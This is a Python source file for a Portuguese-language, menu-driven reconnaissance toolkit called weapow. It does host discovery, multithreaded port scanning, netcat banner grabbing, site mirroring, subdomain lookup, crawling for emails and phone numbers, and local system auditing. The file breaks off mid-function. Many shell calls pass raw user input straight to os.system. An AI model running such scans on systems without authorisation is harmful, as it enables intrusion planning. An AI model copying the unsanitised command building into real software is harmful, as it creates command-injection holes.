#!/usr/bin/env python3
version = "v3.8-dev"

import os
import re
import sys
import socket
import requests
import ipaddress
import threading
import time as t
import getpass as g
import http.server as hs
import socketserver as ss
from bs4 import BeautifulSoup 
from requests.exceptions import SSLError
from urllib.parse import urlparse, urljoin
from concurrent.futures import ThreadPoolExecutor as exx

###########################################################
## BANNER PRINCIPAL DO PROGRAMA, EXIBINDO A VERSÃO ATUAL ##
###########################################################
bann = '''\033[1;33m
888  888  888  .d88b.   8888b.  88888b.   .d88b.  888  888  888
888  888  888 d8P  Y8b     "88b 888 "88b d88""88b 888  888  888
888  888  888 88888888 .d888888 888  888 888  888 888  888  888
Y88b 888 d88P Y8b.     888  888 888 d88P Y88..88P Y88b 888 d88P
 "Y8888888P"   "Y8888  "Y888888 88888P"   "Y88P"   "Y8888888P"
                                \033[1;33m888\033[m'''f''' \033[1;30m  __ _  ___ ____ _________/ /_____\033[m
 (\ (\ \033[1;35m                         \033[m\033[1;33m888\033[m \033[1;30m /  ' \/ _ `/ _ `/ __/ __/  '_/_ /\033[m
 ( ^.^)\033[1;35m-------------------------\033[m\033[1;33m888\033[m \033[1;30m/_/_/_/\_,_/\_,_/_/  \__/_/\_\/__/\033[m
 O_(")(")                       \033[1;33m888\033[m \033[0;31m>DefCyberTool\033[m             \033[7;32m{version}\033[m
 '''

####################################################
## GRUPO DE VARIÁVEIS QUE SÃO REPETIDAS NO CODIGO ##
####################################################
press = '\033[7;31m(Pressione qualquer tecla para voltar ao menu inicial)\033[m'
Ctrl_C = 'Você pressionou Ctrl+C para interromper o programa!'
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
dir = 'mkdir -p ARQ'
list_ip = []

def interfaces():

    ########################################
    ## CRIA UM MENU DE INTERFACES DE REDE ##
    ########################################
    try:
        
        interfaces = []
        for interface_name in os.listdir('/sys/class/net'): 
            
            if interface_name == 'lo':
                continue
            interfaces.append(interface_name)
       
        if not interfaces:
            print("Nenhuma interface de rede encontrada.")
            input(press)
            main()
        ###################################################    
        ## PARA CADA INTERFACE, E CRIADO UM ITEM NO MENU ##
        ###################################################
        print("\nSelecione a interface de rede:")
        for i, interface in enumerate((interfaces), 1):
            print(f"\033[0;34m[{i}]\033[m - {interface}")

        while True:
            try:
                escolha = int(input("Digite a opção: "))
                if escolha < 0 or escolha > len(interfaces):
                    raise ValueError
                break
                if escolha == 0:
                    main()
            except ValueError:
                print("Opção inválida.")
        
        ###################################
        ## CASO SEJA "0" RETORNA AO MENU ##
        ###################################
        if escolha == 0:
            main()
        
        selected_interface = interfaces[escolha - 1]

        return selected_interface

    except KeyboardInterrupt:
        print('\n'+Ctrl_C)
        quit()

#=======================================================================================
#############################################
## FUNÇÃO PARA DESCOBERTA DE HOSTS NA REDE ##
#############################################
def host_discovery():
    
    ##########################################################
    ## CRIA UMA LISTA DE IP DE ACORDO COM A FAIXA FORNECIDA ##
    ##########################################################
    vrf_ip = input('Digite a faixa de IP (Ex: xx.xx.xx.xx/xx): ')
    mask = vrf_ip.split('/')

    ############################################
    ## CRIA UMA VARIAVEL COM O PADRÃO DE IPV4 ##
    ############################################
    regex = re.compile(r"^(\d{1,3}\.)\d{1,3}\.\d{1,3}\.\d{1,3}$")

    try:
        ##################################
        ## TRATAMENTO DE "VAZIO" E MASK ##
        ##################################
        if regex.match(mask[0]) is not None and int(mask[1]) <= 32:
                
            try:
                rede = ipaddress.ip_network(vrf_ip, strict=False)

                ips = list(map(str, rede.hosts()))
                if ips:

                    for ip in ips:
                        list_ip.append(ip)
                else:
                    print("Não foi possível gerar a lista de IPs.")

            except ValueError as e:
                print("Erro:", e)

        else:
            print('\nDigite uma Faixa válida (Ex: 192.168.0.0/16).')
            host_discovery()

    except IndexError as e:
        print("Digite o /xx da Rede.")
        input(press)
        host_discovery()

    #########################################################
    #################### !!! ALERTA !!! #####################
    #########################################################
    print('\n\033[7;31m((Para cancelar segure CTRL+C))\033[m')

    interface = interfaces()

    ###################################################
    ## CRIA PASTA "ARQ" E REMOVE OS ARQUIVOS ANTIGOS ##
    ###################################################
    os.system(dir)
    os.popen('rm ARQ/hosts.txt 2>/dev/null')

    sit_discovery = input('Deseja executar o Hostdiscovery [Menos Acertivo]? (S/N) ')
    print('\n\033[7;32mAguarde ...\033[m')

    if sit_discovery.lower() == 'n':
        #########################################################
        ## REALIZA UM PING EM CADA IP NA INTERFACE SELECIONADA ##
        #########################################################
        try:
            def ping(interface,host):
                result = os.system(f'ping -c 3 -W 1 -I {interface} {host} > /dev/null')
                if result == 0:
                    with open('ARQ/hosts.txt','a') as h:
                        print(host, file=h)
                    print(host)
            
            #####################################################
            ## CRIA UMA POOL DE THREADING PARA A FUNÇÃO "PING" ##
            #####################################################
            thread = 800

            try:
                with exx(max_workers=int(thread)) as exe:
                    for host in list_ip:
                        exe.submit(ping,interface, host)
                        t.sleep(0.05)
                
            except KeyboardInterrupt:
                        print('\n'+Ctrl_C)
                        quit()
            
            input(press)
            main()
        
        except RuntimeError as er:
            print(er)
            quit()
        
        except FileNotFoundError:
            print("\nO arquivo de IPs descobertos deve ser gerado.")
    
    ############################################################################
    ## CASO DECIDA USAR O NETDISCOVERY GERA UM ARQUIVO COM OS IPS ENCONTRADOS ##
    ############################################################################
    if sit_discovery.lower() == 's':
        os.popen('sudo apt install netdiscovery -y 2>/dev/null')
        os.popen('rm .discovery.txt 2>/dev/null ')
        os.system(f"sudo netdiscover -i {interface} -r {vrf_ip} -P | tee .discovery.txt")
        os.popen("tail -n +4 .discovery.txt | head -n -1 | awk '{print $1}' > ARQ/discovery.txt")
        
    else:
        input(press)
        main()



#=======================================================================================
##########################################
## FAZ RESOLUÇÃO DE HOSTNAME VIA SOCKET ##
##########################################
def hostname_resolv():

    try:
        with open("ARQ/hosts.txt", "r") as f:
            lst = f.readlines()
        remove = '\n'
        lst = [l.replace(remove, "") for l in lst]
        print('Hosts descobertos:')
        
        #################################################################
        ## VERIFICA O TTL DA RESPOSTA E "DEFINE" O SISTEMA OPERACIONAL ##
        #################################################################
        for host in lst:
            try:
                socket.setdefaulttimeout(5)
                ttl = s.getsockopt(socket.IPPROTO_IP, socket.IP_TTL)

                if ttl >= 64:
                    OS = 'LinuxLike'

                if ttl < 64:
                    OS = 'WindowsLike'

                if ttl == 255:
                    OS = 'UnixLike'

                #########################################
                ## TENTA FAZER A RESOLUÇÃO DE HOSTNAME ##
                #########################################
                hostname = socket.gethostbyaddr(host)[0]
                print(f'[+] {host} - ({hostname} - {OS})')

                with open("ARQ/hostname.txt", "a") as f:
                    print(f'{host} - ({hostname})', file=f)

            except socket.timeout:
                print(f'[+] {host} - ({OS})')

            except socket.herror:
                print(f'[+] {host} - ({OS})')
                
            except KeyboardInterrupt:
                print("[-] Saindo!")
                quit()

    except FileNotFoundError:
        print('O arquivo hosts.txt deve ser gerado.')
    except OSError:
        pass
    input(press)
    main()


#=======================================================================================
##################################################################################
## ESTA FUNÇÃO FAZ UM PORTSCAN DE ACORDO COM A LISTA GERADO PELO HOST DISCOVERY ##
##################################################################################
def bigscan():

    #########################################################################################
    ## CRIA UM PACOTE SOCKET QUE SE CONECTA NA PORTA, E SE O RESULTADO "0", RETORNA ABERTA ##
    #########################################################################################
    def scan(ip, port, l):

        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(2)  
        print(f'{ip} - {port}')

        try:
            result = s.connect_ex((ip, port))
            espaco = 10 - l
            espaco = " " * espaco
            
            if result != 0: 
                pass

            else:
                with open("ARQ/portscan.txt", "a") as f:

                        ####################################################
                        ## VERIFICA SE EXISTE UM SERVIÇO RODANDO NA PORTA ##
                        ####################################################
                        try:
                            service = f"{socket.getservbyport(port)}"
                            print(f"{str(port)} / TCP {espaco} {service}", file=f)
                            print(str(port) + " / TCP" + espaco + f"{service}       ")

                        ############################################
                        ## EM CASO DE ERRO RETORNA "DESCONHECIDO" ##
                        ############################################
                        except socket.error:
                            print(str(port) + " / TCP" + espaco + "Desconhecido", file=f)
                            print(str(port) + " / TCP" + espaco + "Desconhecido")

                        except KeyboardInterrupt:
                            print("[-] Saindo!")
                            quit()
        ##############################################
        ## EM CASO DE DE COMUNICAÇÃO, EXIBE UM ERRO ##
        ##############################################
        except (socket.timeout, ConnectionRefusedError, OSError) as err:
            print(f"Erro ao verificar porta {port} em {ip}: {err}")

        finally:
            s.close()

        return True

    def portscan_uniq():
      
        interface = interfaces()

        #######################################
        ## SOLICITA O IP E O RANGE DE PORTAS ##
        #######################################
        try:
            ip_alvo = input("Digite o IP alvo: ")
            rang = int(input('Digite o RANGE de portas: '))
            print("Não aparece nada, mas está rodando ...")

            ########################################################
            ## ATRIBUI A QUANTIDADE DE THREADS USADAS NO PORTSCAN ##
            ########################################################
            thread = 1600
            ports = range(rang)

            print("\n[+] Host: " + ip_alvo)
            print("PORTA          SERVIÇO")
            
            ####################################
            ## EXECUTA O PORTSCAN COM THREADS ##
            ####################################
            with exx(max_workers=int(thread)) as exe:
                
                try:
                    for port in ports:
                        exe.submit(scan, ip_alvo, port, len(str(port)))
                
                except KeyboardInterrupt:
                    print("[-] Saindo!")
                    quit()

            #open_ports = [port for port in ports if futures[port].result()] #### NÃO LEMBRO PRA QUE SERVE KKKK
        
        except KeyboardInterrupt:
            print('\n[!] Saindo...')
        
        except FileNotFoundError:
            print("\nO arquivo de hosts descobertos deve ser gerado.")
            input("Pressione Enter para continuar...")
            main()
        
        except AttributeError:
            print("[!] Varredura concluída.")
            input(press)
            main()

    #################################################### 
    ## PORTSCANNER COM SOCKET TCP, NO RANGE INFORMADO ##
    ####################################################
    def portscan():
        os.popen('rm ARQ/portscan.txt 2>/dev/null')

        try:
            ##############################################
            ## QUESTIONA QUAL O HOSTDISCOVERY FOI FEITO ##
            ##############################################
            sit_port = input('Deseja você usou o PADRÃO ou HOSTDISCOVERY? (P/H)')

            if sit_port.lower() == 'p':
                arquivo = 'hosts'

            if sit_port.lower() == 'h':
                arquivo = 'discovery'


            with open(f"ARQ/{arquivo}.txt", "r") as f:
                lst = f.readlines()

            remove = '\n'
            lst = [l.replace(remove, "") for l in lst]
        
            print('\nDependendo da quantidade de hosts, este processo poderá demorar.')

            rang = int(input('Digite o RANGE de portas: '))
            print("Não aparece nada, mas está rodando ...")
            
            ###########################################################
            ## PERCORRE A LISTA DE HOSTDISCOVERY E FAZ O PORTSCANNER ##
            ###########################################################
            for host in lst:

                thread = 400
                ports = range(rang)

                ######################################################
                ## SALVA O PORTSCANNER EM UM ARQUIVO "portscan.txt" ##
                ######################################################
                with open("ARQ/portscan.txt", "a") as f:
                    print("[+] Host: " + host, file=f)
                    print("\n[+] Host: " + host)
                    print("PORTA          SERVIÇO")
                
                ####################################
                ## EXECUTA O PORTSCAN COM THREADS ##
                ####################################
                with exx(max_workers=int(thread)) as exe:
                    
                    try:
                        for port in ports:
                            exe.submit(scan, host, port, len(str(port)))
                    
                    except KeyboardInterrupt:
                        print("[-] Saindo!")
                        quit()
            else:
                input(press)
                main()

            if KeyboardInterrupt:
                print('')

        except KeyboardInterrupt:
            print('\n' + Ctrl_C)

        except FileNotFoundError:
            print("\nO arquivo de hosts descobertos deve ser gerado.")
            input(press)
            main()

    #####################################################################
    ## SOLICITA UMA ENTRADA PARA EXECUTAR O PORTSCAN POR HOST OU LISTA ##
    #####################################################################
    sit_scan = input('Deseja utilizar um (H)ost ou a (L)ista? (H/L): ')
    if sit_scan.lower() == 'h':
        portscan_uniq()

    elif sit_scan.lower() == 'l':
        portscan()

    else:
        print('Opção inválida.')            
            

#=======================================================================================
######################################################################
## ENVIA UMA CONEXÃO VIA NETCAT PARA RETORNAR UM POSSÍVEL CABEÇALHO ##
######################################################################
def nc_get():
    os.popen('rm ARQ/HEAD/* 2>/dev/null')
    os.makedirs("ARQ/HEAD", exist_ok=True)

    print('No código, existe a função nc(), mais lenta e verifica todas as portas.')

    def get(host, porta, servico):
        try:
            comando = f'echo -e "\n" | nc -vn -w 10 {host} {porta} 2>&1 | tee'
            t.sleep(0.6)
            resultado = os.popen(comando).read()
            caminho_arquivo = f"ARQ/HEAD/{host}"

            with open(caminho_arquivo, "a") as arquivo_respostas:
                arquivo_respostas.write(f"[+] Host: {host}    Porta: {porta}    Serviço: {servico}\t\t\n{resultado}\n")
                print(f"[+] Host: {host}    Porta: {porta}    Serviço: {servico}\t\t\n{resultado}\n")

        except Exception as e:
            print(f"Erro ao executar o comando nc: {e}")

    def get_parse():
        with open("ARQ/portscan.txt", "r") as arquivo:
            linhas = arquivo.read().strip().split('\n')
            for linha in linhas:
                if '[+] Host:' in linha:
                    host = linha.split(':')[-1].strip()
                elif 'PORTA' not in linha and '/' in linha:
                    porta, servico = map(str.strip, linha.split('/')[0:2])
                    t = threading.Thread(target=get, args=(host, porta, servico))
                    t.start()
    sit = input("O Programa irá salvar os cabeçalhos das conexões em ./ARQ/HEAD. Deseja continuar (S/N): ")
    if(sit.lower() == 's'):
        get_parse()
    else:
        input(press)
        main()

def nc():
    host_ip = input("Digite o endere  o IP do host: ")
    nome_servico = input("Digite o nome do serviço: ")
    caminho_arquivo = f"ARQ/HEAD/{host_ip}"
    try:
        for porta in range(1, 65536):
            comando = (f'echo -e "\n" | nc -vn -w 1 {host_ip} {porta} 2>&1')
            t.sleep(0.1)
            resultado = os.popen(comando).read()
            with open(caminho_arquivo, "a") as arquivo_respostas:
                arquivo_respostas.write(f"[+] Host: {host_ip}    Porta: {porta}    Servi  o: {nome_servico}\t\>")
                print(f"[+] Host: {host_ip}    Porta: {porta}    Servi  o: {nome_servico}\t\t\n{resultado}\n")
    except Exception as e:
        print(f"Erro ao executar o comando nc: {e}")


#=======================================================================================
###########################################################################
## VERIFICA SE EXISTE RESPOSTA "HTTP" OU "HTTPS" APOS O COMANDO "nc -vz" ##
###########################################################################
def http_finder():

    ###################################################
    ## ESTA FUNÇÃO FAZ O DOWNLOAD DO SITE ENCONTRADO ##
    ###################################################
    def wget_pg(ip, porta):
        os.system(f"rm ARQ/WEB/{ip}.html")
        os.system(f'wget --no-check-certificate --mirror --convert-links --adjust-extension --page-requisites --timeout=10 http://{ip}:{porta} -P ARQ/WEB/')
    
    
    for ip in os.listdir("ARQ/HEAD"):
        arquivo = os.path.join("ARQ/HEAD", ip)

        if os.path.isfile(arquivo):
            with open(arquivo, 'r') as arquivo:
                conteudo = arquivo.readlines()
                servico_web_encontrado = False
                porta = None
                for linha in conteudo:
                    match = re.search(r'Porta: (\d+)', linha)
                    if match:
                        porta = match.group(1)
                    if "http" in linha.lower() or "https" in linha.lower():
                        servico_web_encontrado = True
                        break
                if servico_web_encontrado:
                    thread = threading.Thread(target=wget_pg, args=(ip, porta))
                    thread.start()
    for thread in threading.enumerate():
        if thread != threading.current_thread():
            thread.join()


#=======================================================================================          
def cert_subdomain():
    target_domain = input('Digite o dominio: ')
    target = target_domain.replace('www.', '').split('/')[0]

    try:
        req = requests.get(f"https://crt.sh/?q=%.{target}&output=json")
        req.raise_for_status()
    except requests.RequestException:
        print("[X] Information not available!")

    subdomains = sorted({value['name_value'] for value in req.json()})

    print(f"\n[!] TARGET: {target} [!] \n")

    for subdomain in subdomains:
        print(subdomain)


#=======================================================================================
def link():
    def crawl(url):
        try:
            response = requests.get(url)
        except SSLError as e:
            print(f"SSLError: {e}")
            return []
        if response.status_code == 200:
            soup = BeautifulSoup(response.content, 'html.parser')
            links = soup.find_all('a')
            hrefcode = {urljoin(url, link['href']) for link in links if 'href' in link.attrs}
            return hrefcode
        return []

    def ext_info(url):
        durls = []
        emails = set()
        tel = set()
        forms = []
        subdomains = set()

        try:
            response = requests.get(url)
        except SSLError as e:
            print(f"SSLError: {e}")
            return durls, emails, tel, forms, subdomains
        except requests.exceptions.RequestException as e:
            print(f"RequestException: {e}")
            return durls, emails, tel, forms, subdomains

        if response.status_code == 200:
            soup = BeautifulSoup(response.content, 'html.parser')

            for link in soup.find_all('a'):
                href = link.get('href')
                if link is soup.find('id'):
                    print(link)
                elif link is not None:
                    try:
                        if href and href.startswith('/') or href.startswith('?'):
                            durls.append(urljoin(url, href))
                        else:
                            print(href)
                    except AttributeError as e:
                        print(link,href,e)
            for link in soup.find_all('a'):
                href = link.get('href')
                if href:
                    if href.startswith("mailto:"):
                        emails.add(href[7:])
                    elif href.startswith("tel:") or "phone=" in href:
                        tel.add(href[4:])

            for form in soup.find_all('form'):
                forms.append(url)

            for link in soup.find_all('a'):
                href = link.get('href')
                if href:
                    parsed_uri = urlparse(href)
                    domain = '{uri.netloc}'.format(uri=parsed_uri).split(':')[0]
                    subdomains.add(domain)
        return durls, emails, tel, forms, subdomains #######################################  LEMBRAR COMO FUNCIONA

    def process_url(url):
        visit_urls = set()
        if url in visit_urls:
            return
        visit_urls.add(url)
        divurls = crawl(url)
        print("\n\nEfetuando WebCrawling em ", url)
        for divurl in sorted(divurls):
            print('\n\033[0;31m============================================================================================>>\033[m',t.strftime("\033[7;32m %d/%m/%y \033[m"))
            print(divurl)
            print('\033[0;31m============================================================================================>>\033[m',t.strftime("\033[7;32m %H:%M:%S \033[m"))

            durls, emails, tel, forms, subdomains = ext_info(divurl)

            if durls:
                print('\nURLs INTERNAS:')
                for url in durls:
                    print(url)
                    try:
                        links(url)
                    except requests.exceptions.ConnectionError as err:
                        pass
            if emails:
                print('\nEMAILS:')
                for email in emails:
                    print(email)
            if tel:
                print('\nTELEFONES:')
                for phone in tel:
                    print(phone)
            if forms:
                print('\nFORMULÁRIOS:')
                for form in forms:
                    print(form)
            if subdomains:
                print('\nSITES:')
                for subdomain in subdomains:
                    print(subdomain)
            if durls:
                print('\nURLs INTERNAS:')
                for url in durls:
                    print(url)

    def links(target):
        url_process = ['http://' + target]
        url_atual = url_process.pop()
        process_url(url_atual)
        sit = input('\nDeseja salvar qo WebCrawl? (S/N) ')
        if(sit.lower() == 's'):
            print('Aguarde enquanto o arquivo está sendo salvo ...')
            with open(f'{target}_craw.txt', 'w') as f:
                while url_process:
                    url_atual = url_process.pop()
                    os.dup2(f.fileno(), 1)
                    process_url(url_atual)
                    os.dup2(os.dup(2), 1)
            print("WebCrawler salvo com sucesso!")
    sit_scan = input('Deseja utilizar um (H)ost ou a (L)ista? (H/L): ')
    if (sit_scan.lower() == 'h'):
        target = input('Digite o endereço do site: (site.com)\n')
        links(target)
    elif (sit_scan.lower() == 'l'):
        for ip in os.listdir("ARQ/WEB"):
            links(ip)
            nsit = input('A busca neste host terminou. Deseja continuar? (S/N):  ')
            if nsit.lower() == 's':
                pass
            else:
                break


#=======================================================================================
def auto_web():
    ips = os.popen('grep -iR -A 5 "<form" ARQ/WEB | grep -Eo "([0-9]{1,3}\.){3}[0-9]{1,3}" | sort -u').read().split()
    for ip in ips:
        caminho_html = f'ARQ/WEB/{ip}/index.html'
        with open(caminho_html, 'r', encoding='utf-8') as arquivo:
            conteudo_html = arquivo.read()
            soup = BeautifulSoup(conteudo_html, 'html.parser')
            formularios = soup.find_all('form', {'action': True, 'method': True})

            if ip and formularios:
                print('---------------------------------------------------------')
                print(f'\nAnalisando {ip}:\n')
                soup = BeautifulSoup(conteudo_html, 'html.parser')
                formularios = soup.find_all('form', {'action': True, 'method': True})

                for formulario in formularios:
                    print(f'Atributo action: {formulario["action"]}')
                    print(f'Atributo method: {formulario["method"]}')
                    print(f'Conteúdo do formulário:')
                    print(formulario.prettify())
                    print('---------------------------------------------------------\n')
    try:
        for ip in ips:
            caminho_html = f'ARQ/WEB/{ip}/index.php'
            with open(caminho_html, 'r', encoding='utf-8') as arquivo:
                conteudo_html = arquivo.read()
                soup = BeautifulSoup(conteudo_html, 'html.parser')
                formularios = soup.find_all('form', {'action': True, 'method': True})

                if ip and formularios:
                    print('---------------------------------------------------------')
                    print(f'\nAnalisando {ip}:\n')
                    soup = BeautifulSoup(conteudo_html, 'html.parser')
                    formularios = soup.find_all('form', {'action': True, 'method': True})

                    for formulario in formularios:
                        print(f'Atributo action: {formulario["action"]}')
                        print(f'Atributo method: {formulario["method"]}')
                        print(f'Conteúdo do formulário:')
                        print(formulario.prettify())
                        print('---------------------------------------------------------\n')
    except FileNotFoundError:
        pass
    input("Pressione Enter para continuar...")
    main()


#=======================================================================================
def backup():
    print("Este processo poderá levar MUITO tempo dependendo da quantidade de arquivos.")
    sit_bak = input('Deseja realmente fazer BKP do usuário desta estação? (S/N) ')
    try:
        if(sit_bak.lower() == "s"):
            dir = input("Digite o diretório a ser feito o BKP:\n")
            print('Fazendo BACKUP ...')
            t.sleep(2)
            os.system(f'cp -v -r {dir} /home/$USER/Backup')
        else:
            input(press)
            main()
    except KeyboardInterrupt:
        print('\n'+Ctrl_C)


#=======================================================================================
def clonar():
    '''
    df -h
umount -t ext4 /dev/sdx && mkfs.ext4 /dev/sdx
	dd if=/deb/sdx of=/dev/sdy bs=1M conv=noerror
sudo blkid
sudo nano /etc/fstab
    '''
    pass


#=======================================================================================
def cron():
    print('''
Para configurar uma rotina C[R]ON:

\033[1;33m*  *  *  *  *  /usr/bin/python3 /caminho/do/script.*\033[m
\033[0;31m-  -  -  -  -     |                                |\033[m
\033[0;31m|  |  |  |  |     +---\033[m Caminho do Executável\033[m       \033[0;31m+---\033[m Extensão do arquivo a ser Executado. Ex: .sh .c .py
\033[0;31m|  |  |  |  |
\033[0;31m|  |  |  |  +----------------------\033[m Dia da Semana (0-6) [Sendo 0 = Domingo]
\033[0;31m|  |  |  +-------------------------\033[m Mês (1-12)
\033[0;31m|  |  +----------------------------\033[m Dia do Mês (1-31)
\033[0;31m|  +-------------------------------\033[m Hora (0-23)
\033[0;31m+----------------------------------\033[m Minutos (0-59) se quiser a cada 15min use: '/15'

Exemplo:
\033[7;33m*/15 * * * * /usr/bin/python3 /caminho/do/weapow.py\033[m   [A cada 15min EXEC o arquivo weapow.py usando Python3]
\033[7;33m30 15 14 6 * /tmp/backup.sh\033[m                        [No dia 14JUN às 15:30 EXEC o backup.sh]


Você pode conferir a alteração com o comando: "\033[0;34m$ crontab -e\033[m"

''')
    sit_cron = input("Deseja substituir as configurações do C[R]ON? (S/N)")
    if(sit_cron.lower() == "s"):
        try:
            enter = input("Digite a entrada do C[R]ON:\n")
            os.system(f'echo "{enter}" | crontab -')
            print('C[R]ON configurado corretamente.')
            input(press)
            main()
        except TypeError:
            print("Faltam [Argumentos] para entrada")
            input(press)
            main()
    else:
        input(press)
        main()


#=======================================================================================
def finder():
    try:
        find = str(input('Digite o arquivo que deseja encontrar: '))
        print('Procurando com FIND:')
        print('==================================================================================\n')
        os.system(f'sudo find / -name {find} 2>/dev/null | grep {find}')
        print('Procurando com GREP:')
        print('==================================================================================\n')
        os.system(f'sudo grep -iRl {find} / 2>/dev/null')
        print('\n==================================================================================')
        print('Fim da busca!\n')
        input(press)
        main()
    except KeyboardInterrupt:
        print('\n'+Ctrl_C)


#=======================================================================================
def infosys():
    try:
        output = ''

        output += '\n'
        output += 'WHOAMI =======================================================\n'
        output += '            User: {}'.format(os.popen('whoami').read())
        output += os.popen('hostnamectl').read()
        output += '      IPAddress : {}'.format(os.popen("ip addr | awk '/inet / {if (++n == 2) print $2}'").read())
        output +="\n   Current Path : {}".format(os.popen('pwd').read())
        output +='===============================================================\n'

        output += '\n'
        output += 'ID ============================================================\n'
        output += os.popen('id').read()
        output += '===============================================================\n'

        output += '\n'
        output += 'UNAME =========================================================\n'
        output += os.popen('uname -a').read()
        output += os.popen('cat /proc/cmdline').read()
        output += '===============================================================\n'

        output += '\n'
        output += 'TTY +==========================================================\n'
        output += os.popen('who').read()
        output += os.popen('cat /proc/consoles').read()
        output += '===============================================================\n'

        output += '\n'
        output += 'CPU ===========================================================\n'
        output += os.popen('cat /proc/cpuinfo | grep "model name" | uniq').read()
        output += os.popen(''' cat /proc/cpuinfo | awk '/cpu cores/ {gsub("cpu cores", "Cores"); print}' | uniq''').read()
        output += os.popen(''' cat /proc/cpuinfo | awk '/siblings/ {gsub("siblings", "Threads"); print}' | uniq''').read()
        output += '===============================================================\n'

        output += '\n'
        output += 'MEMÓRIA ========================================================\n'
        output += os.popen('cat /proc/meminfo | grep MemTotal').read()
        output += os.popen('cat /proc/meminfo | grep MemFree').read()
        output += os.popen('cat /proc/meminfo | grep MemAvailable').read()
        output += os.popen('cat /proc/meminfo | grep SwapTotal').read()
        output += os.popen('cat /proc/meminfo | grep SwapFree').read()
        output += '===============================================================\n'

        output += '\n'
        output += 'REDES =========================================================\n'
        output += os.popen('ip addr').read()
        output += '===============================================================\n'

        output += '\n'
        output += 'NETSTAT =======================================================\n'
        output += os.popen('netstat -ano').read()
        output += '\n'
        output += os.popen('netstat -nr').read()
        output += '===============================================================\n'

        output += '\n'
        output += 'ROTAS =========================================================\n'
        output += os.popen('cat /proc/net/route').read()
        output += '===============================================================\n'

        output += '\n'
        output += 'SISTEMAS ======================================================\n'
        output += os.popen('df -h').read()
        output += '===============================================================\n'

        output += '\n'
        output += 'PARTIÇÕES =====================================================\n'
        output += os.popen('lsblk -p -f -o NAME,FSTYPE,LABEL,UUID,SIZE,TYPE,TRAN,MODE').read()
        output += '===============================================================\n'

        output += '\n'
        output += 'USB ===========================================================\n'
        output += os.popen('cat /etc/modprobe.d/blacklist.conf ').read()
        output += '===============================================================\n'

        output += '\n'
        output += 'DISPOSITIVOS ==================================================\n'
        output += os.popen('cat /proc/devices').read()
        output += '===============================================================\n'

        output += '\n'
        output += 'LSPCI =========================================================\n'
        output += os.popen('lspci').read()
        output += '===============================================================\n'

        output += '\n'
        output += 'LSUSB =========================================================\n'
        output += os.popen('lsusb').read()
        output += '===============================================================\n'

        output += '\n'
        output += 'LSLOGINS ======================================================\n'
        output += os.popen('lslogins').read()
        output += '===============================================================\n'

        output += '\n'
        output += 'CAPTIVEF ======================================================\n'
        output += os.popen('echo Travando o programa.').read()
        #output += os.popen('getcap -r / 2>/dev/null').read()
        output += '===============================================================\n'

        output += '\n'
        output += 'VARIAVEIS DE AMBIENTE =========================================\n'
        output += os.popen('env').read()
        output += '===============================================================\n'

        output += '\n'
        output += 'PROCESSOS =====================================================\n'
        output += os.popen('ps axjf').read()
        output += '===============================================================\n'

        output += '\n'
        output += 'SERVIÇOS ======================================================\n'
        output += os.popen('systemctl --type=service --state=active | grep ^').read()
        output += '===============================================================\n'


        prog = input('Deseja exibir os programas instalados? (S/N) ')
        if(prog.lower() == "s"):
            output += '\n'
            output += 'PROGRAMAS INSTALADOS ===========================================\n'
            output += os.popen('dpkg --list | grep ^ii.').read()
            output += '===============================================================\n'

        output += '\n'
        output += 'BASH HISTORY===================================================\n'
        output += 'O histórico do BASH deve ser salvo manualmente por enquanto!\n'
        output += 'Use o comando: $ history\n'
        output += '===============================================================\n'

        print(output)

        sit_audi = input('Deseja salvar em arquivo? (S/N) ')
        if(sit_audi.lower() == "s"):
            os.system('rm -rf ARQ/auditoria.txt')
            with open('ARQ/auditoria.txt', 'w') as file:
                file.write(output)
            print('Seu Arquivo foi gerado com Sucesso!')
            input(press)
            main()
        else:
            input(press)
            main()
    except KeyboardInterrupt:
        print('\n'+Ctrl_C)
    except FileNotFoundError:
        os.system(dir)
        with open('ARQ/auditoria.txt', 'w') as file:
                file.write(output)
        print('Seu Arquivo foi gerado com Sucesso!')
        input(press)
        main()


#=======================================================================================
def config():
    os.system('clear')
    ver = "v1.0-dev"
    print(f'''\033[1;33m
.d8888b.                     .d888 d8b             88888888888                888
d88P  Y88b                   d88P"  Y8P                 888                    888
888    888                   888                        888                    888
888         .d88b.  88888b.  888888 888  .d88b.         888   .d88b.   .d88b.  888
888        d88""88b 888 "88b 888    888 d88P"88b        888  d88""88b d88""88b 888
888    888 888  888 888  888 888    888 888  888        888  888  888 888  888 888
Y88b  d88P Y88..88P 888  888 888    888 Y88b 888        888  Y88..88P Y88..88P 888
 "Y8888P"   "Y88P"  888  888 888    888  "Y88888        888   "Y88P"   "Y88P"  888
                                             888
                                        Y8b d88P       \033[0;31m>Esta função precisa de SUDO!\033[m
                                         "Y88P"                            \033[7;32m{ver}\033[m''')
    print(''' MENU:

    \033[0;34m[1]\033[m - Criar usuário em RBASH
    \033[0;34m[2]\033[m - Permitir BASH padrão
    \033[0;34m[3]\033[m - Restringir TODOS os comandos
    \033[0;34m[4]\033[m - Config SSH
    \033[0;34m[5]\033[m - xxx
    \033[0;34m[6]\033[m - xxx
    \033[0;34m[7]\033[m - xxx
    \033[0;34m[8]\033[m - xxx
    \033[0;34m[9]\033[m - xxx
    \033[0;34m[10]\033[m- xxx
    ''')
    try:
        opcao=int(input('Escolha uma opção: '))

        if opcao == 1:
            user = input('Qual o usuário a ser configurado? ')
            os.system(f"sudo useradd -m -s /bin/rbash {user}")
            senha = g.getpass("Digite a senha: ")
            os.system(f"echo '{user}:{senha}' | sudo chpasswd")
            os.system(f"sudo chown root: /home/{user}/.profile")
            os.system(f"sudo chown root: /home/{user}/.bashrc")
            os.system(f"sudo chmod 755 /home/{user}/.profile")
            os.system(f"sudo chmod 755 /home/{user}/.bashrc")
            print(f"Usuário '{user}' criado com sucesso, senha definida e permissões ajustadas.")
            input(press)
            main()

        elif opcao == 2:
            user = input('Qual o usuário a ser configurado? ')
            os.system(f"sudo usermod --shell /bin/bash {user}")

        elif opcao == 3:
            if os.path.exists('/usr/share/block'):
                print("O script já foi executado anteriormente. Evitando repetição.")
                input("Pressione Enter para continuar...")
                main()
            else:
                comandos = os.popen('apropos ""').read()
                lines = comandos.splitlines()
                first_names = []

                for line in lines:
                    words = line.split()
                    if words:
                        if any(cmd in words for cmd in ["cat","ls", "cd", "exit"]):
                            continue
                        else:
                            first_names.append(words[0])

                with open('block', 'w') as block_file:
                    for name in first_names:
                        block_file.write(name + '\n')

                sita = input('Deseja confirmar o bloqueio? (S/N)')
                if sita.lower() == 's':
